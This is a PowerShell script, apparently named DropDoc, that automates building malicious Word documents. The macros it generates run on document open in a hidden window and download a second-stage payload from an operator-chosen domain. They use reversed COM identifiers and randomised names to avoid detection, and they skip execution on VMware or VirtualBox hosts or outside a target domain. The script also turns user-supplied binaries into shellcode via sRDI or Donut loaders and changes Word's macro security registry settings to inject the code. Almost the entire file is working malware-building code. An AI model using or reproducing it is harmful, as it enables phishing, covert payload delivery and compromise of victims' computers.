[cmdletbinding()]

    Param(
    
    [Parameter (Mandatory = $true, Position = 0)]
    [string] $docname
    
    )

<#
.SYNOPSIS

DropDoc - Automate the malicious MS Word Maldocs creation.

.DESCRIPTION
This Script automate the process of maldocs creation for education pourposes.

.PARAMETER docname
Final name for the maldoc.

.EXAMPLE
PS > .\DropDoc.ps1 docname

.LINK
http://tuxtrack.github.io/
https://github.com/tuxtrack/
#>


Write-Host ""'
 ·▄▄▄▄  ▄▄▄         ▄▄▄··▄▄▄▄         ▄▄· 
 ██▪ ██ ▀▄ █·▪     ▐█ ▄███▪ ██ ▪     ▐█ ▌▪
 ▐█· ▐█▌▐▀▀▄  ▄█▀▄  ██▀·▐█· ▐█▌ ▄█▀▄ ██ ▄▄
 ██. ██ ▐█•█▌▐█▌.▐▌▐█▪·•██. ██ ▐█▌.▐▌▐███▌
 ▀▀▀▀▀• .▀  ▀ ▀█▄▀▪.▀   ▀▀▀▀▀•  ▀█▄▀▪·▀▀▀ 
      https://tuxtrack.github.io
'"" -ForegroundColor Red

$NewLine = "`n"

Function InstallationChecks{

    $CheckGadGet = Test-Path .\Converters\GadgetToJScript.exe
    If ($CheckGadGet -eq $True)
    {
        Init
    }
    
    Else
    {
        Write-Host "[+] It's the first time you've running this project" -ForegroundColor Green
        Write-Host "[+] Please compile the GadgetToJScript solution from the ""Third Party Projects"" folder." -ForegroundColor Green

    }
    
}

Function OpsecOptions(){

    
    $DomainName = Read-Host "[+] Insert the Active Directory domain name"

    $global:NonStone = "Function UserProfile() As Boolean" + $NewLine
    $global:NonStone += "    Dim VmWareFileName As String" + $NewLine
    $global:NonStone += "    Dim VBoxFileName As String" + $NewLine
    $global:NonStone += "    Dim vm As Integer" + $NewLine  
    $global:NonStone += "    Dim VmWareFileExists As String" + $NewLine
    $global:NonStone += "    Dim VBoxFileExists As String" + $NewLine  
    $global:NonStone += "    VmWareFileName = ""C:\Windows\System32\drivers\vmhgfs.sys""" + $NewLine
    $global:NonStone += "    VBoxFileName = ""C:\Windows\System32\drivers\VBoxVideo.sys""" + $NewLine
    $global:NonStone += "    VmWareFileExists = Dir(VmWareFileName)" + $NewLine
    $global:NonStone += "    VBoxFileExists = Dir(VBoxFileName)" + $NewLine
    $global:NonStone += "    Dim strDomain As String" + $NewLine
    $global:NonStone += "    Set wshNetwork = CreateObject(""WScript.Network"")" + $NewLine
    $global:NonStone += "    strUserDomain = wshNetwork.UserDomain" + $NewLine
    $global:NonStone += "    strDomain = ""$DomainName""" + $NewLine   
    $global:NonStone += "    Select Case True" + $NewLine
    $global:NonStone += "    Case VmWareFileExists = ""vmhgfs.sys"": vm = 1" + $NewLine
    $global:NonStone += "    Case VBoxFileExists = ""VBoxVideo.sys"": vm = 1" + $NewLine
    $global:NonStone += "    Case strUserDomain <> strDomain: vm = 1" + $NewLine
    $global:NonStone += "    End Select" + $NewLine
    $global:NonStone += "    If vm = 1 Then" + $NewLine
    $global:NonStone += "        UserProfile = False" + $NewLine
    $global:NonStone += "    Else" + $NewLine
    $global:NonStone += "        UserProfile = True" + $NewLine
    $global:NonStone += "    End If" + $NewLine
    $global:NonStone += "    " + $NewLine
    $global:NonStone += "" + $NewLine
    $global:NonStone += "End Function" + $NewLine
    $global:NonStone += "Private Sub Document_Open" + $NewLine
    $global:NonStone += "    Set myWindow = ActiveDocument.ActiveWindow.NewWindow" + $NewLine
    $global:NonStone += "    myWindow.Visible = False" + $NewLine
    $global:NonStone += "    If UserProfile = True Then" + $NewLine
    $global:NonStone += "        Tyrion" + $NewLine
    $global:NonStone += "        Tywin" + $NewLine
    $global:NonStone += "    Else" + $NewLine
    $global:NonStone += "        Tywin" + $NewLine
    $global:NonStone += "    End If" + $NewLine
    $global:NonStone += "End Sub" + $NewLine
        
    Deploy
}

Function CreateDoc(){

    $link = $(Read-Host "[+] Insert the domain name for second stage download")

    $a = $link

    $a = $a.ToCharArray()

    
    $a = $a -replace "A" , "65"	    #The A key.
    $a = $a -replace "B" , "66"	    #The B key.
    $a = $a -replace "C" , "67"	    #The C key.
    $a = $a -replace "D" , "68"	    #The D key.
    $a = $a -replace "E" , "69"	    #The E key.
    $a = $a -replace "F" , "70"	    #The F key.
    $a = $a -replace "G" , "71"	    #The G key.
    $a = $a -replace "H" , "72"	    #The H key.
    $a = $a -replace "I" , "73"	    #The I key.
    $a = $a -replace "J" , "74"	    #The J key.
    $a = $a -replace "K" , "75"	    #The K key.
    $a = $a -replace "L" , "76"	    #The L key.
    $a = $a -replace "M" , "77"	    #The M key.
    $a = $a -replace "N" , "78"	    #The N key.
    $a = $a -replace "O" , "79"     #The O key.
    $a = $a -replace "P" , "80"	    #The P key.
    $a = $a -replace "Q" , "81"	    #The Q key.
    $a = $a -replace "R" , "82"	    #The R key.
    $a = $a -replace "S" , "83"	    #The S key.
    $a = $a -replace "T" , "84"	    #The T key.
    $a = $a -replace "U" , "85"	    #The U key.
    $a = $a -replace "V" , "86"	    #The V key.
    $a = $a -replace "W" , "87"	    #The W key.
    $a = $a -replace "X" , "88"	    #The X key.
    $a = $a -replace "Y" , "89"	    #The Y key.
    $a = $a -replace "Z" , "90"	    #The Z key.
    $a = $a -replace "/" , "191"	#The / key.
    $a = $a -replace "-" , "189"	#The - key.

    Function JoinEncode(){
        foreach($n in $a){
        $result = "keyString($n)"
        $result
        }
    }

    $a = JoinEncode

    $a = $a.replace("keyString(:)", '":"').replace("keyString(.)", '"."')

    $a = $a.replace("keyString(0)" , "keyString(48)").replace("keyString(1)" , "keyString(49)").replace("keyString(2)" , "keyString(50)").replace("keyString(3)" , "keyString(51)").replace("keyString(4)" , "keyString(52)")
    $a = $a.replace("keyString(5)" , "keyString(53)").replace("keyString(6)" , "keyString(54)").replace("keyString(7)" , "keyString(55)").replace("keyString(8)" , "keyString(56)").replace("keyString(9)" , "keyString(57)")

    $a = $a -join " + "

    $link = $a

    $randomvar = "$(Get-Random)" + ".xml"
    
    $directory = New-Item -Path "$env:USERPROFILE\Desktop\" -Name $docname -ItemType "Directory" 

    $back ="Sub Backflip()" + $NewLine
    $back +="    Set http = GetObject(StrReverse(""}594076B97766-BA8A-3594-FEC2-4F2C7802{:wen""))" + $NewLine
    $back +="    URL = hahaha + ""/"" + ""$randomvar""" + $NewLine
    $back +="    http.Open ""GET"", URL, False" + $NewLine
    $back +="    http.setRequestHeader ""Content-Type"", ""application/x-www-form-urlencoded; charset=UTF-8"""  + $NewLine
    $back +="    http.send" + $NewLine
    $back +="    http.WaitForResponse" + $NewLine
    $back +="    If http.Status = 200 Then" + $NewLine       
    $back +="        Dim path_1 As String" + $NewLine
    $back +="        path_1 = Environ(StrReverse(""ATADPPA"")) + ""\..\Local\"" + ""$randomvar""" + $NewLine        
    $back +="        Set ObjStream = GetObject(StrReverse(""}4AE2D600AA00-0008-0100-0000-66500000{:wen""))" + $NewLine
    $back +="        ObjStream.Open" + $NewLine
    $back +="        ObjStream.Type = 1" + $NewLine
    $back +="        ObjStream.Write http.ResponseBody" + $NewLine
    $back +="        ObjStream.SaveToFile path_1, 2" + $NewLine
    $back +="        ObjStream.Close" + $NewLine
    $back +="    Else" + $NewLine
    $back +="        Tywin" + $NewLine
    $back +="    End If" + $NewLine    
    $back +="End Sub" + $NewLine


    . .\Converters\GadgetToJScript.exe -a $AssemblyFile -b -encodeType=hex -w vba | Out-Null

    $MacroCode = Get-Content ".\test.vba" | Out-String

    $MacroCode = $MacroCode -replace 'download', $back 

    $MacroCode = $MacroCode -replace 'hahaha', $link

    $MacroCode = $MacroCode -replace 'randomfile', $randomvar

    
    If (($opsec -eq "Yes") -and ($StoneChecks -eq "Stone")){

        $MacroCode += $Stone
    }

    Elseif (($opsec -eq "Yes") -and ($StoneChecks -eq "NonStone")){

        $MacroCode += $NonStone
    }

    Else {

        $Macrocode += "Private Sub Document_Open" + $NewLine
        $Macrocode += "    Set myWindow = ActiveDocument.ActiveWindow.NewWindow" + $NewLine
        $Macrocode += "    myWindow.Visible = False" + $NewLine
        $Macrocode += "        Tyrion" + $NewLine
        $Macrocode += "        Tywin" + $NewLine
        $Macrocode += "End Sub" + $NewLine
    }


    $hexDecode = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_}) 
    $xmlObj = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})    
    $nodeObj = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})   
    $http = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})    
    $tywin = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})     
    $Backflip = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})  
    $tyrion = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})    
    $ObjStream = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})     
    $manifesto = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})   
    $stm_1 = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})    
    $stm_2 = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})    
    $fmt_1 = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})    
    $Decstage_1 = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})     
    $Decstage_2 = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})     
    $stage1 = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})    
    $stage2 = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})    
    $cxp1 = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})      
    $cxn = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})       
    $paf = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})       
    $path_1 = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})      
    $tt1 = -join ((65..90) + (97..122) | Get-Random -Count 40 | % {[char]$_})       
    $tt2 = -join ((65..90) + (97..122) | Get-Random -Count 40 | % {[char]$_})        
    $tt3 = -join ((65..90) + (97..122) | Get-Random -Count 40 | % {[char]$_})        
    $tt4 = -join ((65..90) + (97..122) | Get-Random -Count 40 | % {[char]$_})        
    $tt5 = -join ((65..90) + (97..122) | Get-Random -Count 40 | % {[char]$_})       
    $UserProfile = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})        
    $ThreeCxFileName = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})    
    $VmWareFileName = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})
    $VBoxFileName = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})
    $strDomain = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})
    $wshNetwork = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})
    $ThreeCxFileExists = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})
    $VmWareFileExists = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})
    $VBoxFileExists = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_})

    $MacroCode = $MacroCode -replace 'hexDecode', $hexDecode
    $MacroCode = $MacroCode -replace 'xmlObj', $xmlObj
    $MacroCode = $MacroCode -replace 'nodeObj', $nodeObj
    $MacroCode = $MacroCode -replace 'http', $http
    $MacroCode = $MacroCode -replace 'Tywin', $Tywin
    $MacroCode = $MacroCode -replace 'Backflip', $Backflip
    $MacroCode = $MacroCode -replace 'Tyrion', $Tyrion
    $MacroCode = $MacroCode -replace 'ObjStream', $ObjStream
    $MacroCode = $MacroCode -replace 'manifesto', $manifesto
    $MacroCode = $MacroCode -replace 'stm_1', $stm_1
    $MacroCode = $MacroCode -replace 'stm_2', $stm_2
    $MacroCode = $MacroCode -replace 'fmt_1', $fmt_1
    $MacroCode = $MacroCode -replace 'Decstage_1', $Decstage_1
    $MacroCode = $MacroCode -replace 'Decstage_2', $Decstage_2
    $MacroCode = $MacroCode -replace 'stage1', $stage1
    $MacroCode = $MacroCode -replace 'stage2', $stage2
    $MacroCode = $MacroCode -replace 'cxp1', $cxp1
    $MacroCode = $MacroCode -replace 'cxn', $cxn
    $MacroCode = $MacroCode -replace 'path_1', $path_1
    $MacroCode = $MacroCode -replace 'paf', $paf
    $MacroCode = $MacroCode -replace 'tt1', $tt1
    $MacroCode = $MacroCode -replace 'tt2', $tt2
    $MacroCode = $MacroCode -replace 'tt3', $tt3
    $MacroCode = $MacroCode -replace 'tt4', $tt4
    $MacroCode = $MacroCode -replace 'tt5', $tt5
    $MacroCode = $MacroCode -replace 'UserProfile', $UserProfile
    $MacroCode = $MacroCode -replace 'ThreeCxFileName', $ThreeCxFileName
    $MacroCode = $MacroCode -replace 'VmWareFileName', $VmWareFileName
    $MacroCode = $MacroCode -replace 'VBoxFileName', $VBoxFileName
    $MacroCode = $MacroCode -replace 'strDomain', $strDomain
    $MacroCode = $MacroCode -replace 'wshNetwork', $wshNetwork
    $MacroCode = $MacroCode -replace 'ThreeCxFileExists', $ThreeCxFileExists
    $MacroCode = $MacroCode -replace 'VmWareFileExists', $VmWareFileExists
    $MacroCode = $MacroCode -replace 'VBoxFileExists', $VBoxFileExists

    $StageOne = Get-Content ".\stage-one.txt"
    $StageTwo = Get-Content ".\stage-two.txt"

    $CustomXML = Get-Content ".\Templates\InteropWord.xml"
    $CustomXML = $CustomXML -replace "stage1", $StageOne
    $CustomXML = $CustomXML -replace "stage2", $StageTwo
    $CustomXMLFile = "$env:USERPROFILE\Desktop\" + $directory.name + "\" + $randomvar
    $CustomXML | Set-Content $CustomXMLFile

    Remove-Item ".\stage-one.txt"
    Remove-Item ".\stage-two.txt"
    Remove-Item ".\test.vba"

    $Word01 = New-Object -ComObject "Word.Application"
    $WordVersion = $Word01.Version

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    $Word01.DisplayAlerts = "wdAlertsNone"
    $Word01.Visible = $false

    $Document01 = $Word01.Documents.Add()

    $WordModule = $Document01.VBProject.VBComponents(1)
    $WordModule.CodeModule.AddFromString($MacroCode)

    Add-Type -AssemblyName Microsoft.Office.Interop.Word

    $docpath = "$env:USERPROFILE\Desktop\" + $directory.name
    $Document01.SaveAs("$docpath\$($docname).doc", 0)
    Write-Host "[+] Saved at: $docpath folder" -ForegroundColor Red

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

    $Word01.Documents.Close()
    $Word01.Quit()
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word01) | out-null
    $Word01 = $Null
    Remove-Item $TempPath

    Write-Output "[+] Enjoy"

}

Function sRDI(){

    $Malfile = Read-Host "[+] Insert the artifact path"

    Write-Host "[+] Converting $MalFile in shellcode using sRDI"

    . .\Converters\ConvertTo-Shellcode.ps1

    $scode = ConvertTo-Shellcode $Malfile

    $CSSource = Get-Content ".\Templates\DropTemplate.cs"

    $CSSource = $CSSource -replace "//1", ""

    $CSSource = $CSSource -replace 'scode = {};', "scode = {$($scode -join ',')};"

    $TempPath = [System.IO.Path]::GetTempFileName()

    $AssemblyFile = ".\loader.dll"

    Write-Host "[+] Compiling $TempPath to $AssemblyFile"

    $CSSource | Set-Content $TempPath

    & 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe' @(
                "/out:`"$($AssemblyFile)`"",
                '/target:library',
                "`"$($TempPath)`"",
                '/noconfig',
                '/unsafe-',
                '/nostdlib+',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorlib.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Core.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Data.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.dll',
                '/optimize-'
                ) | Out-Null

    CreateDoc
    Remove-Item "$AssemblyFile"
}

Function Donut(){

    $Malfile = Read-Host "[+] Insert the artifact path"

    Write-Host "[+] Converting $MalFile to shellcode using Donut"

    if ($MalFile -like "*.dll")
    {
        $namespace = Read-Host "[+] Insert NameSpace"
        $class = Read-Host "[+] Insert Class Name"
        $method =  Read-Host "[+] Insert Method Name"

        .\Converters\donut.exe -f $MalFile -c $($namespace + "." + $class) -m $method | Out-Null
    }
    else
    {
        .\Converters\donut.exe -f $MalFile | Out-Null
    }

    $payload = Join-Path $pwd -ChildPath "payload.bin"

    $scode = [convert]::ToBase64String([IO.File]::ReadAllBytes($payload))

    Write-Host "[+] Saving shellcode in resource file"

    $TempPath = [System.IO.Path]::GetTempFileName() + ".resx"

    $Resources = Get-Content ".\Templates\Resources.resx"

    $Resources = $Resources -replace "b64", "$scode"

    $Resources | Set-Content $TempPath

    $CSSource = Get-Content ".\Templates\DropTemplate.cs"

    $CSSource = $CSSource -replace "//2", ""

    .\Converters\ResGen.exe /useSourcePath /compile $($TempPath),replicant.Resources.resources | Out-Null

    $TempPath = [System.IO.Path]::GetTempFileName()

    $AssemblyFile = ".\loader.dll"

    Write-Host "[+] Compiling $TempPath to: $AssemblyFile"

    $CSSource | Set-Content $TempPath


    & 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe' @(
                "/out:`"$($AssemblyFile)`"",
                '/target:library',
                "`"$($TempPath)`"",
                '/noconfig',
                '/unsafe-',
                '/nostdlib+',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorlib.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Core.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Data.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.dll'
                '/optimize-'
                '/resource:replicant.Resources.resources'
                ) | Out-Null

    Remove-Item .\replicant.Resources.resources
    Remove-Item ".\payload.bin"

    CreateDoc

    Remove-Item "$AssemblyFile"
}

Function Deploy(){

    $option = $(Read-Host "[+] Insert [U] for unmanaged code or [M] for managed code")

    if ($option -eq "U")
    {
        sRDI
    }
    Elseif ($option -eq "M")
    {  
        Donut
    }
    Else 
    {
        Write-Host "[+] Wrong option, try again." -ForegroundColor DarkGreen
        Deploy
    }
}

Function Init{

    
    $opsec = $(Read-Host "[+] Do you want to add OPSEC checks to you malware? Type Yes or No")
    

    if ($opsec -eq "Yes")
    {
        OpsecOptions
    }
    
    Elseif ($opsec -eq "No")
    {
        Deploy
    }    
    
    Else
    {
        Write-Host "[+] Wrong option, try again." -ForegroundColor DarkGreen
        Init
    } 
}

InstallationChecks
